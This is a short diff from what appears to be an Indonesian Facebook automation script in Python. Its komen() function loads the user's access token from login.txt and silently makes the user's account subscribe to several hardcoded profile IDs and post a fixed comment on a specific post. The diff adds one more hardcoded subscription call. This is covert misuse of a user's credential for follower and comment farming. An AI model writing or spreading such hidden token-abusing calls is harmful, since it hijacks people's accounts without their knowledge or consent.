@@ -87,11 +87,12 @@ def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
         try:
                 toket=open('login.txt','r').read()
         except IOError:
-                print (' *! Cookies Invalid')
+                print (' *! Token Invalid')
                 login()
         kom = 'Cantik Banget Bang ❤️\n'+pantun
         kom2 = 'Cantik Banget Bang ❤️\n'+pantun
         requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100001017488339/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + toket)
         requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +kom+ '&access_token=' + toket)
